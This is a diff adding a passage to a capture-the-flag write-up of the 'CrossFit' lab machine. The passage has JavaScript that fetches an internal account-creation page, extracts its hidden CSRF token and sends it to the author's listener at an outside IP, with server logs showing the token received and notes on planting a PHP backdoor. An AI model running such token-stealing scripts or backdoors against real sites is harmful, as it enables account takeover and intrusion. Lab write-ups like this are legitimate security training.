@@ -443,6 +443,46 @@ With this page it looked as if I could create a new account.  I would need to se
 
 ![](../../.gitbook/assets/2.5-recreate-adduser.png)
 
+* [https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html](https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html)
+* [https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser](https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser)
+
+```javascript
+//testing access to ftp.crossfit.htb
+//
+var test = "http://ftp.crossfit.htb/accounts/create";
+var request1 = new XMLHttpRequest();
+request1.open('GET', test, false);
+request1.send()
+var response1 = request1.responseText;
+
+//var request2 = new XMLHttpRequest();
+//send response1 to my waiting python http.server 
+//request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
+//request2.send();
+
+//var token = response1.getElementsByName('_token')[0].value;
+var parser = new DOMParser();
+var response_text = parser.parseFromString(response1, "text/html");
+var token = response_text.getElementsByName('_token')[0].value;
+
+var request3 = new XMLHttpRequest();
+//send _token value to my waiting python http.server 
+request3.open('GET', 'http://10.10.14.161:8090/' + token, true);
+request3.send();
+```
+
+I modified my script to return only the hidden token.  At first I tried just reading the value of the `_token` element, but after some troubleshooting and more reading I found that the response text wasn't being properly parsed.  Once I was able to correctly parse this from the output I could send my post request to the server to create a new user.  First I had the test script send the token back to me so I could see that it worked.
+
+```markup
+10.10.10.208 - - [21/Mar/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 19:37:38] code 404, message File not found
+10.10.10.208 - - [21/Mar/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
+```
+
+I received the reply back, this time with only the hidden token.
+
+
+
 wrote payload to create new ftp user
 
 can PUT files, upload php backdoor
